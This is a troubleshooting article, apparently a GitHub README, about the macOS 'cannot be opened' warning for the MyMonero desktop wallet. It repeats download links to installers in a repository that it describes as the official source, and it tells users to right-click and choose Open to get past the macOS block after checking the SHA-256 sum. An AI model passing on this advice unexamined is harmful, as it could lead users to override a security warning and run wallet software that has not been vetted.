<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">macOS Says MyMonero Cannot Be Opened: Safe Steps</h1>
<p align="center">Use the specific right-click Open guidance and avoid weakening security for an untrusted download.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
If macOS says MyMonero cannot be opened, first confirm that the app came from the monero-projects GitHub release. For the stated macOS block, right-click the app and choose Open; do not use that step to justify running a file from an unknown source.


Prefer reading on the web? The [MyMonero app not opening page](https://mymonero.info/mymonero-app-not-opening) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) covers the common questions.

## You'll see this if
- macOS shows a warning when you try to start MyMonero.
- The app icon appears but the window never opens.
- You see a message that the application cannot be opened.
- You are unsure whether a downloaded .dmg is genuine or complete.
- You are attempting hosted web-wallet login rather than launching the desktop app.

## Why it happens
An operating-system warning is not, on its own, proof that a wallet is lost or that a download is safe. The exact text matters, and this article gives only the general macOS instruction specified for this block: right-click the app and choose Open. If the download is unfamiliar, stop and verify its source before opening it. Do not interpret a generic warning as a reason to disable broad protections or run an unrelated helper.

The final MyMonero desktop release is v1.3.3 on the monero-projects GitHub release page. It provides a macOS .dmg alongside Windows .exe and Linux .zip packages. The old app still opens wallets and sends XMR, but is no longer maintained and receives no new features or security updates. Hosted MyMonero servers and web-wallet login stopped, so trying a web login is distinct from opening a Mac app. See [MyMonero shutdown facts](./mymonero-shutdown-facts.md).

A Mac warning may occur before the wallet opens, while a sync problem occurs after the app is running. For launch symptoms see [MyMonero app not opening](./mymonero-app-not-opening.md); for a running app that cannot update information, see [MyMonero not syncing](./mymonero-not-syncing.md).

---

## Fix
1. **Pause and confirm the source.** Think about where the .dmg came from. If it arrived in an unsolicited message, an advertisement, or an unfamiliar page, do not open it. Nobody legitimate needs your seed to help with a Mac launch warning.
2. **Use the official release source.** The final desktop build is [MyMonero v1.3.3 on GitHub](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). Confirm you have the macOS .dmg package, not an executable intended for another operating system.
3. **Check the file’s SHA-256.** Compare the computed value with the value shown on the release page. On macOS, run `shasum -a 256 <file>` in a terminal, replacing `<file>` with the path to the downloaded file. Do not publish a checksum command output together with private wallet information. If the values do not match, do not open the file; obtain a fresh copy from the release source and compare again.
4. **Open the app using the stated macOS route.** Locate the app, right-click it, then choose Open. Read the prompt before proceeding. This specific route is for the app from the release source, not a general instruction to override warnings for arbitrary files.
5. **Try one normal launch.** If the app opens, allow it to load and observe whether the issue is resolved. If it immediately closes, note the non-sensitive message and see [MyMonero app crashes on start](./mymonero-app-crashes-on-start.md). Avoid repeatedly removing and downloading files without checking the source.
6. **Keep the wallet and hosted service separate.** If the problem is a hosted web login, MyMonero hosted servers and web-wallet login stopped. Installing a Mac app does not revive that access. The desktop app is the separate option, with its maintenance limitations.
7. **Think through alternatives deliberately.** You may keep using MyMonero desktop or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Read MyMonero to Cake Wallet migration before restoring.

> [!TIP]
> Save the exact warning text and the fact that you used the release .dmg, but leave out wallet addresses, recovery words, private keys, and passwords.

---

## If that did not work
Do not disable system-wide security settings, install a “certificate fixer,” or give someone remote control of your Mac because of a warning. If the SHA-256 does not match the release page, stop using that copy. If it matches but the app still does not launch, preserve the seed backup and record the symptom; this guide cannot identify a more specific system cause.

A launch block does not require seed restoration. If you decide to restore, first establish whether you have 13 MyMonero-specific legacy words or 25 standard Monero words. Use 13-word seed restore guidance or 25-word migration guidance. Do not share the words with anyone. Offline recovery of a missing seed word is not confirmed here, and no password-reset method is stated.

Restoring may involve a block height from which the wallet scans. Earlier is safer when the correct point is uncertain but takes longer. Read MyMonero restore height explained. A restore is different from sweeping funds: sweeping sends all funds to a new wallet and should be a considered action, not a response to a macOS prompt.

> [!WARNING]
> Nobody legitimate asks for your seed to clear a Mac warning. Do not type recovery words into a web form, send them in a message, or let a purported helper take control of the device.

---

## Prevention
Download the .dmg from the monero-projects release page and compare its SHA-256 value before use. The final release is v1.3.3, and the old desktop app has no new features or security updates. Checksum verification confirms file integrity against the published value; it does not mean the software is currently maintained.

Keep a secure seed backup away from the Mac. Never rely on a browser page or support contact to store recovery words for you. Avoid links to fake installers, including those that claim to remove macOS warnings. See MyMonero fake download warning and safe seed backup practices.

When deciding whether to continue with desktop or restore in Cake Wallet, review the platform and seed-format details first. Do not rush because of a warning. For broader context, see is MyMonero safe?.

## FAQ
<details><summary>What is the specified macOS step?</summary>

For the stated app block, right-click the app and choose Open. Only do this for a file whose source you have checked.

</details>

<details><summary>Does the warning mean my wallet has disappeared?</summary>

No. A launch prompt alone does not determine wallet or fund status. Preserve your seed backup and investigate the app source.

</details>

<details><summary>Should I disable all Mac security features?</summary>

No broad security change is recommended here. Verify the official release file and use the specific right-click Open instruction only when appropriate.

</details>

<details><summary>Can I log in on the MyMonero website instead?</summary>

MyMonero hosted servers and web-wallet login stopped. Hosted access is not a substitute for the desktop app.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Not Syncing](./mymonero-not-syncing.md) | Tell a connection problem from a wallet scan that needs more time. |
| [MyMonero Error 523: What It Means and What to Try](./mymonero-error-523.md) | Understand a server-connection error and check your wallet without risking recovery information. |
| [MyMonero Error Codes List and Safe Troubleshooting](./mymonero-error-codes-list.md) | A cautious guide to interpreting wallet errors without treating every message as a lost-funds warning. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
